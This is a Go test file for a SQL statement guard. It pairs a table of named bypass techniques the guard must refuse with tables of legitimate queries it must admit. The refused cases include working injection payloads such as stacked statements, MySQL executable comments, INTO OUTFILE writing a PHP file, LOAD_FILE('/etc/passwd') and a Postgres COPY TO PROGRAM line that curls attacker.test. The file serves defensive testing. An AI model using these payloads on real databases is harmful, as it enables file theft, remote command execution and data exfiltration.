package sqlguard_test

import (
	"errors"
	"strings"
	"testing"

	"github.com/kilaslabs/kilas-flow/internal/sqlguard"
)

// Every entry here was executed against the pinned driver before it was
// written down. The technique name is the point of each row: a future reader
// deciding whether some simplification is safe needs to know which specific
// trick each case exists to stop.
func TestTheGuardRefusesEveryVerifiedBypass(t *testing.T) {
	t.Parallel()

	for _, row := range []struct {
		technique string
		dialect   sqlguard.Dialect
		sql       string
	}{
		{
			technique: "a comment hides the verb from a substring search",
			dialect:   sqlguard.SQLite,
			sql:       `/*x*/ATTACH DATABASE '/tmp/secret.db' AS k; SELECT payload FROM k.credentials`,
		},
		{
			technique: "a benign statement leads, so the first keyword looks safe",
			dialect:   sqlguard.SQLite,
			sql:       `SELECT 1; ATTACH DATABASE '/tmp/secret.db' AS zz`,
		},
		{
			technique: "bound parameters do not stop the second statement",
			dialect:   sqlguard.SQLite,
			sql:       `ATTACH DATABASE '/tmp/secret.db' AS k2; SELECT payload FROM k2.credentials WHERE 1=?`,
		},
		{
			technique: "VACUUM INTO copies the whole database, with no semicolon at all",
			dialect:   sqlguard.SQLite,
			sql:       `VACUUM INTO '/tmp/exfil.db'`,
		},
		{
			technique: "PRAGMA reconfigures the connection",
			dialect:   sqlguard.SQLite,
			sql:       `PRAGMA writable_schema = ON`,
		},
		{
			technique: "DETACH is ATTACH's other half",
			dialect:   sqlguard.SQLite,
			sql:       `DETACH DATABASE k`,
		},
		{
			technique: "a nested block comment desyncs a depth counter from a server that does not nest",
			dialect:   sqlguard.SQLite,
			sql:       `SELECT 1 /* /* */ ; DROP TABLE t`,
		},
		{
			technique: "MySQL executes a version-gated comment as code",
			dialect:   sqlguard.MySQL,
			sql:       `/*!50000 SET sql_mode = '' */`,
		},
		{
			technique: "MySQL executes a version-gated comment with no space after the digits",
			dialect:   sqlguard.MySQL,
			sql:       `/*!50000SET sql_mode = '' */`,
		},
		{
			technique: "a version-gated comment hides a second statement",
			dialect:   sqlguard.MySQL,
			sql:       `SELECT 1 /*!50000 ; DROP TABLE t */`,
		},
		{
			technique: "a CTE cloaks a verb that is not on the list",
			dialect:   sqlguard.Postgres,
			sql:       `WITH x AS (SELECT 1) COPY t TO PROGRAM 'sh'`,
		},
		{
			technique: "MySQL reads two dashes without whitespace as code, not a comment",
			dialect:   sqlguard.MySQL,
			sql:       "SELECT 1 --x;DROP TABLE t",
		},
		{
			technique: "a hash comment hides a statement from a dialect that has them",
			dialect:   sqlguard.MySQL,
			sql:       "SELECT 1; #\nDROP TABLE t",
		},
		{
			technique: "a backslash may or may not end the string, so both readings must be safe",
			dialect:   sqlguard.Postgres,
			sql:       `SELECT 'a\'; DROP TABLE t; --'`,
		},
		{
			technique: "SELECT INTO OUTFILE writes a server-side file from inside an allowed verb",
			dialect:   sqlguard.MySQL,
			sql:       `SELECT * FROM t INTO OUTFILE '/var/www/html/x.php'`,
		},
		{
			technique: "SELECT INTO DUMPFILE is the same write by another name",
			dialect:   sqlguard.MySQL,
			sql:       `SELECT payload FROM t INTO DUMPFILE '/tmp/x'`,
		},
		{
			technique: "LOAD_FILE reads a server-side file from inside an allowed verb",
			dialect:   sqlguard.MySQL,
			sql:       `SELECT LOAD_FILE('/etc/passwd')`,
		},
		{
			technique: "COPY TO PROGRAM runs a shell command as the server's user",
			dialect:   sqlguard.Postgres,
			sql:       `COPY t TO PROGRAM 'sh -c "curl attacker.test"'`,
		},
		{
			technique: "DO runs a procedural block, which pgx's extended protocol does not stop",
			dialect:   sqlguard.Postgres,
			sql:       `DO $$ BEGIN PERFORM 1; PERFORM 2; END $$`,
		},
		{
			technique: "CREATE FUNCTION carries a body the server executes later",
			dialect:   sqlguard.Postgres,
			sql:       `CREATE FUNCTION f() RETURNS int AS $$ SELECT 1 $$ LANGUAGE sql`,
		},
		{
			technique: "CREATE TRIGGER carries a statement body",
			dialect:   sqlguard.SQLite,
			sql:       `CREATE TRIGGER tr AFTER INSERT ON t BEGIN SELECT 1; END`,
		},
		{
			technique: "LOAD DATA INFILE reads a server-side file",
			dialect:   sqlguard.MySQL,
			sql:       `LOAD DATA INFILE '/etc/passwd' INTO TABLE t`,
		},
		{
			technique: "SET reaches session state, including sql_mode",
			dialect:   sqlguard.MySQL,
			sql:       `SET sql_mode = ''`,
		},
		{
			technique: "GRANT changes who may do what",
			dialect:   sqlguard.Postgres,
			sql:       `GRANT ALL ON t TO PUBLIC`,
		},
		{
			technique: "PREPARE stores a payload for a later EXECUTE",
			dialect:   sqlguard.Postgres,
			sql:       `PREPARE p AS SELECT 1`,
		},
		{
			technique: "transaction control breaks the node's own framing",
			dialect:   sqlguard.Postgres,
			sql:       `COMMIT`,
		},
		{
			technique: "an unterminated string leaves the server and the lexer disagreeing",
			dialect:   sqlguard.SQLite,
			sql:       `SELECT 'a`,
		},
		{
			technique: "an unterminated dollar quote, likewise",
			dialect:   sqlguard.Postgres,
			sql:       `SELECT $tag$ a`,
		},
		{
			technique: "an empty statement is not a statement",
			dialect:   sqlguard.SQLite,
			sql:       `   ;  `,
		},
	} {
		t.Run(row.technique, func(t *testing.T) {
			err := sqlguard.Check(row.dialect, row.sql)
			if err == nil {
				t.Fatalf("allowed: %s", row.sql)
			}
			if !errors.Is(err, sqlguard.ErrRefused) {
				t.Errorf("error = %v, want it to wrap ErrRefused so a caller can tell it from a driver error", err)
			}
		})
	}
}

// The other half of the guard: everything legitimate still goes through.
//
// A guard that refuses real statements would be worked around rather than
// fixed, so the cases a semicolon or a quote appears in innocently matter as
// much as the attacks.
func TestTheGuardAdmitsWhatItShould(t *testing.T) {
	t.Parallel()

	for _, row := range []struct {
		about   string
		dialect sqlguard.Dialect
		sql     string
	}{
		{about: "a plain read", dialect: sqlguard.Postgres,
			sql: `SELECT id, email FROM public.customers WHERE tier = $1`},
		{about: "a semicolon inside a string literal does not split",
			dialect: sqlguard.SQLite, sql: `SELECT 'a;b' FROM t`},
		{about: "a doubled quote inside a string does not end it",
			dialect: sqlguard.SQLite, sql: `SELECT 'it''s; not' FROM t`},
		{about: "a bracketed identifier may contain a semicolon",
			dialect: sqlguard.SQLite, sql: `SELECT [weird;col] FROM t`},
		{about: "a backticked identifier may contain a semicolon",
			dialect: sqlguard.MySQL, sql: "SELECT `a;b` FROM t"},
		{about: "a double-quoted identifier may contain a semicolon",
			dialect: sqlguard.Postgres, sql: `SELECT "a;b" FROM t`},
		{about: "a dollar-quoted string may contain a semicolon",
			dialect: sqlguard.Postgres, sql: `SELECT $$;$$`},
		{about: "a dollar quote closes only on its own tag",
			dialect: sqlguard.Postgres, sql: `SELECT $a$ ; $b$ ; x $a$`},
		{about: "a placeholder is not a dollar quote",
			dialect: sqlguard.Postgres, sql: `SELECT $1 FROM t WHERE id = $2`},
		{about: "a trailing semicolon is still one statement",
			dialect: sqlguard.SQLite, sql: `SELECT c FROM t;`},
		{about: "a trailing semicolon and a comment are still one statement",
			dialect: sqlguard.SQLite, sql: "SELECT c FROM t;  -- done"},
		{about: "a leading semicolon is tolerated",
			dialect: sqlguard.SQLite, sql: `; SELECT c FROM t`},
		{about: "a leading comment does not hide the verb",
			dialect: sqlguard.Postgres, sql: `/* report */ SELECT 1`},
		{about: "a read CTE is a read",
			dialect: sqlguard.Postgres,
			sql:     `WITH recent AS (SELECT id FROM orders WHERE created_at > $1) SELECT * FROM recent`},
		{about: "a recursive read CTE is a read",
			dialect: sqlguard.Postgres,
			sql:     `WITH RECURSIVE t(n) AS (VALUES (1) UNION ALL SELECT n+1 FROM t WHERE n < 100) SELECT sum(n) FROM t`},
		{about: "two CTEs then a read",
			dialect: sqlguard.Postgres,
			sql:     `WITH a AS (SELECT 1), b AS (SELECT 2) SELECT * FROM a, b`},
		{about: "a CTE with a column list",
			dialect: sqlguard.Postgres,
			sql:     `WITH a (x, y) AS (SELECT 1, 2) SELECT * FROM a`},
		{about: "a CTE followed by a delete is the delete, and deletes are allowed",
			dialect: sqlguard.Postgres,
			sql:     `WITH x AS (SELECT c FROM t) DELETE FROM t WHERE c IN (SELECT c FROM x)`},
		{about: "a CTE followed by an insert, likewise",
			dialect: sqlguard.Postgres,
			sql:     `WITH x AS (SELECT c FROM t) INSERT INTO t SELECT c FROM x`},
		{about: "an executable comment carrying an ordinary statement",
			dialect: sqlguard.MySQL, sql: `/*!50000 SELECT 1 */`},
		{about: "managing a PostgreSQL schema",
			dialect: sqlguard.Postgres, sql: `DROP SCHEMA IF EXISTS reporting CASCADE`},
		{about: "a parenthesised read",
			dialect: sqlguard.Postgres, sql: `(SELECT 1) UNION (SELECT 2)`},
		{about: "a parenthesis inside a string does not unbalance the CTE walk",
			dialect: sqlguard.Postgres,
			sql:     `WITH a AS (SELECT ')' AS c) SELECT * FROM a`},
		{about: "an insert on the write operation",
			dialect: sqlguard.Postgres,
			sql:     `INSERT INTO t (a) VALUES ($1) RETURNING id`},
		{about: "creating a table",
			dialect: sqlguard.SQLite,
			sql:     `CREATE TABLE customers (id INTEGER PRIMARY KEY, name TEXT)`},
		{about: "creating a table if it does not exist",
			dialect: sqlguard.Postgres,
			sql:     `CREATE TABLE IF NOT EXISTS queue (id serial primary key)`},
		{about: "creating a unique index",
			dialect: sqlguard.Postgres,
			sql:     `CREATE UNIQUE INDEX idx ON t (a)`},
		{about: "dropping a table",
			dialect: sqlguard.MySQL, sql: "DROP TABLE IF EXISTS `t`"},
		{about: "truncating",
			dialect: sqlguard.Postgres, sql: `TRUNCATE TABLE t RESTART IDENTITY`},
		{about: "an upsert",
			dialect: sqlguard.Postgres,
			sql:     `INSERT INTO t (id) VALUES ($1) ON CONFLICT (id) DO UPDATE SET id = EXCLUDED.id`},
		{about: "a MySQL insert-ignore",
			dialect: sqlguard.MySQL, sql: "INSERT IGNORE INTO `t` (`a`) VALUES (?)"},
		{about: "a column genuinely named like a forbidden phrase is not a phrase",
			dialect: sqlguard.MySQL, sql: "SELECT `into outfile` FROM t"},
		{about: "the word ATTACH inside a string literal is data",
			dialect: sqlguard.SQLite, sql: `SELECT c FROM t WHERE c = 'ATTACH DATABASE'`},
	} {
		t.Run(row.about, func(t *testing.T) {
			if err := sqlguard.Check(row.dialect, row.sql); err != nil {
				t.Fatalf("refused a legitimate statement: %v\nSQL: %s", err, row.sql)
			}
		})
	}
}

// Every statement internal/sqlbuild generates must pass its own guard.
//
// The builders are the safe path a user is pushed toward when the guard
// refuses hand-written SQL, so a guard that refused them would leave no way to
// do the work at all.
func TestTheGuardAdmitsEveryStatementTheBuildersGenerate(t *testing.T) {
	t.Parallel()

	for _, row := range []struct {
		dialect sqlguard.Dialect
		sql     string
	}{
		{sqlguard.Postgres, `SELECT * FROM "public"."customers" ORDER BY "tier" ASC, "id" DESC`},
		{sqlguard.Postgres, `SELECT * FROM "public"."customers" WHERE "tier" = $1 LIMIT 50`},
		{sqlguard.Postgres, `INSERT INTO "public"."customers" ("email") VALUES ($1) RETURNING *`},
		{sqlguard.Postgres, `INSERT INTO "public"."c" ("a") VALUES ($1) ON CONFLICT DO NOTHING RETURNING *`},
		{sqlguard.Postgres, `UPDATE "public"."c" SET "a" = $1 WHERE "id" = $2 RETURNING *`},
		{sqlguard.Postgres, `DELETE FROM "public"."c" WHERE "tier" = $1`},
		{sqlguard.Postgres, `TRUNCATE TABLE "public"."c" RESTART IDENTITY`},
		{sqlguard.Postgres, `DROP TABLE IF EXISTS "public"."c" CASCADE`},
		{sqlguard.MySQL, "SELECT * FROM `customers` ORDER BY `tier` ASC"},
		{sqlguard.MySQL, "INSERT IGNORE INTO `c` (`a`) VALUES (?)"},
		{sqlguard.MySQL, "INSERT INTO `c` (`a`) VALUES (?) ON DUPLICATE KEY UPDATE `a` = VALUES(`a`)"},
		{sqlguard.MySQL, "TRUNCATE TABLE `c`"},
		{sqlguard.MySQL, "DROP TABLE IF EXISTS `c`"},
	} {
		t.Run(strings.SplitN(row.sql, " ", 2)[0]+"/"+row.dialect.Name(), func(t *testing.T) {
			if err := sqlguard.Check(row.dialect, row.sql); err != nil {
				t.Fatalf("the guard refuses a statement this server generates: %v\nSQL: %s", err, row.sql)
			}
		})
	}
}

// A transaction's list is checked element by element.
func TestEveryStatementInATransactionIsCheckedOnItsOwn(t *testing.T) {
	t.Parallel()

	if err := sqlguard.CheckAll(sqlguard.SQLite, []string{
		`INSERT INTO t (a) VALUES (?)`,
		`UPDATE t SET a = ?`,
	}); err != nil {
		t.Fatalf("refused a legitimate transaction: %v", err)
	}

	// A list is not a licence to hide two statements in one element: the
	// driver runs both, so the count the caller reasoned about would be wrong.
	err := sqlguard.CheckAll(sqlguard.SQLite, []string{
		`INSERT INTO t (a) VALUES (?)`,
		`UPDATE t SET a = ?; ATTACH DATABASE '/tmp/x.db' AS k`,
	})
	if err == nil {
		t.Fatal("a transaction element carrying two statements was allowed")
	}
	if !strings.Contains(err.Error(), "statement 2") {
		t.Errorf("error = %v, want it to name which element was refused", err)
	}
}
